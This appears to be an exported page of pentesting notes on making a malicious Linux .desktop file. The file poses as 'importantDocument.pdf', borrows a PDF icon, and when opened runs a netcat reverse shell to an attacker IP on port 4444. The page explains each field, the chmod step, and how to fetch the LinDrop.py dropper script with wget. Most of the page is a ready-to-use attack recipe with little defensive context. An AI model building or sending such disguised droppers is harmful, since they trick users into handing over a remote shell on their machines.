<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>malicious file with .desktop file vulnerability</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>malicious file with .desktop file vulnerability</h1><br/><strong>Manually generate malicious file with .desktop file vulnerability</strong><br />.desktop file in linux very similar to the shortcut .lnk file in Windows. Both allow us to create a shortcut to an application<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<br /><span style="color:#ff9d00;font-weight:700">touch</span> test.desktop</pre></div> <br /><a href=""><img src="images/986-1.png" alt="images/986-1.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">locate</span> *pdf.svg     <span style="color:#0088ff;font-weight:400">#find on the pc a pdf icon for our file</span></pre></div><br /><div class="codebox"><pre>gedit test.desktop</pre></div><br />    <div class="codebox"><pre>[Desktop Entry]      <br />Type=Application<br />Name=importantDocument.pdf<br />Exec=/bin/nc -e /bin/sh 192.168.43.97 4444<br />Icon=/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/gscan2pdf.svg</pre></div><br />    <a href=""><img src="images/986-2.png" alt="images/986-2.png" /></a><br />    <strong>[Desktop Entry]</strong> → field that tells us that this is a .desktop file but is not required for functioning<br />    <strong>Type</strong> → specify the type of the .desktop file, there are 3 types that we can use: Application, Link, Directory<br />    <strong>Name</strong> → file name that will be showed to end user, &quot;test.desktop&quot; will be renamed to “importantDocument.pdf” and the .desktop will be hidden<br />    <strong>Exec</strong> → command that will be executed when the user will open the file<br />    <strong>Icon</strong> → path to the icon that the user will see, to see the icon the file must to be on the Desktop<br />    <a href=""><img src="images/986-3.png" alt="images/986-3.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">chmod</span> +x test.desktop</pre></div><br /><br /><br /><strong>To create these files we can also use a script called: LinDrop.py</strong><br /><a href=""><img src="images/986-4.png" alt="images/986-4.png" /></a><br />GitHub site: <a href="https://github.com/secmode/LinDrop/blob/master/LinDrop.py">https://github.com/secmode/LinDrop/blob/master/LinDrop.py</a><br />explanation: <a href="https://www.obscurechannel.com/x42/lindrop.html">https://www.obscurechannel.com/x42/lindrop.html</a><br /><br />Script used to create malicious pdf file<br />Download script<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>bin<br /><span style="color:#ff9d00;font-weight:700">mkdir</span> lindrop<br /><span style="color:#ff9d00;font-weight:700">cd</span> lindrop<br /><span style="color:#ff9d00;font-weight:700">wget</span> <span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/secmode/LinDrop/master/LinDrop.py&quot;</span></pre></div><br /><br /><br /></div>
</body>
</html>
